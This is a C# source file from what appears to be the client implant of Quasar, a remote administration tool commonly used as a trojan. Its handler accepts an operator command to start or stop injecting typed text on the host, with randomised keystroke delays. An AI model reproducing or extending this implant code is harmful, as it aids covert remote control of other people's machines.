using Quasar.Client.Interception;
using Quasar.Common.Messages;
using Quasar.Common.Networking;
using System.Threading;

namespace Quasar.Client.Messages
{
    public class AutoTypeHandler : IMessageProcessor
    {
        public bool CanExecute(IMessage message) => message is DoAutoType;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case DoAutoType msg:
                    Execute(sender, msg);
                    break;
                default:
                    break;
            }
        }

        private void Execute(ISender client, DoAutoType message)
        {
            new Thread(() =>
            {
                if(message.Action == "stop")
                {
                    InterceptionHelper.isAutoType = false;
                    return;
                }
                else if(message.Action == "start")
                {
                    InterceptionHelper.isAutoType = true;
                    InterceptionHelper.SendText(message.Text,client, message.MinDelay, message.MaxDelay);
                    return;
                }
            })
            { IsBackground = true }.Start();
        }
    }
}
